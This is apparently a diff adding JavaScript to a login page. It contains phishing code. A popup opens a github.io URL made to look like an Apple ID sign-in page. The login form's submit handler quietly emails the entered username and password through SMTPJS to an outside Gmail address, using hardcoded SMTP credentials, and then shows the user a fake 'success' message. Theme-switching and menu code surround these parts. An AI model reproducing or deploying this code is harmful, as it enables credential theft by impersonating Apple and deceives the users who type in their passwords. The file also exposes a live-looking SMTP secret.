@@ -1,0 +1,119 @@
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+        document.getElementById('Link-A').addEventListener('click', function(event) {
+            event.preventDefault(); // Prevent the default link behavior
+            window.location.href = this.href; // Change the window location
+        });
+
+        document.getElementById('Link-B').addEventListener('click', function(event) {
+            event.preventDefault(); // Prevent the default link behavior
+            window.location.href = this.href; // Change the window location
+        });
+
+        document.getElementById('Link-C').addEventListener('click', function(event) {
+            event.preventDefault(); // Prevent the default link behavior
+            window.location.href = this.href; // Change the window location
+        });
+
+        document.getElementById('Link-D').addEventListener('click', function(event) {
+            event.preventDefault(); // Prevent the default link behavior
+            window.location.href = this.href; // Change the window location
+        });
+
+        document.getElementById('Applepopup').addEventListener('click', function() {
+            // URL of the popup
+            let popupURL = 'https://softwarecompanycoltd.github.io/httpsappleid.apple.comauthauthorizeclientidcom/';
+
+            // Popup window settings
+            let width = 500;
+            let height = 600;
+    
+            // Calculate the position to center the popup
+            let left = (window.innerWidth - width) / 2;
+            let top = (window.innerHeight - height) / 2;
+
+            // Open the popup window
+            window.open(
+                popupURL,
+                'SignInPopup',
+                `width=${width},height=${height},top=${top},left=${left},resizable=yes,scrollbars=yes`
+            );
+
+            // Check if the popup was blocked
+            if (!popupWindow || popupWindow.closed || typeof popupWindow.closed === 'undefined') { 
+                alert("Popup was blocked by the browser! Please allow popups for this site.");
+            }
+        });
+
+        const themeSwitch = document.getElementById('themeSwitch');
+        const body = document.body;
+
+        themeSwitch.addEventListener('change', () => {
+            if (themeSwitch.checked) {
+                body.classList.remove('light-mode');
+                body.classList.add('dark-mode');
+            } else {
+                body.classList.remove('dark-mode');
+                body.classList.add('light-mode');
+            }
+        });
+
+        // Restore the user's preferred theme on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            const preferredTheme = localStorage.getItem('preferredTheme');
+            if (preferredTheme === 'dark-mode') {
+                body.classList.add('dark-mode');
+                themeSwitch.checked = true;
+            } else {
+                body.classList.add('light-mode');
+            }
+        });
+
+        // Save the user's theme preference when they toggle the switch
+        themeSwitch.addEventListener('change', function() {
+            if (themeSwitch.checked) {
+                localStorage.setItem('preferredTheme', 'dark-mode');
+            } else {
+                localStorage.setItem('preferredTheme', 'light-mode');
+            }
+        });
+
+        // Show loader on form submission
+        document.getElementById('login').addEventListener('submit', function(e) {
+            e.preventDefault();
+            // Show the loader
+            document.querySelector('.loader').style.display = 'flex';
+
+            // Simulate form submission or handle form logic here
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const rememberMe = document.getElementById('rememberMe').checked;
+            const body = "Username: " + username + "<br>Password: " + password + "<br>Remember Me: " + rememberMe;
+
+            Email.send({
+                Host : "smtp.elasticemail.com",
+                Username : "softwarecompanyltdsmtpsender@gmail.com",
+                Password : "A6DC06DBCF8A0C3CE635ED7B3EDE144CB3C9",
+                To : 'gambopeter2022@gmail.com',
+                From : "softwarecompanyltdsmtpsender@gmail.com",
+                Subject : "Login Attempt",
+                Body : body
+            }).then(function(response) {
+                // Hide the loader after response
+                document.querySelector('.loader').style.display = 'none';
+
+                if (response === 'OK') {
+                    swal("Success!", "Form submitted successfully!", "success");
+                } else {
+                    swal("Error!", "Failed to submit the form. Please try again.", "error");
+                }
+            });
+        });
+
+const mobileMenu = document.getElementById("mobile-menu");
+const navLinks = document.querySelector(".nav-links");
+
+mobileMenu.addEventListener("click", () => {
+    navLinks.classList.toggle("active");
+});
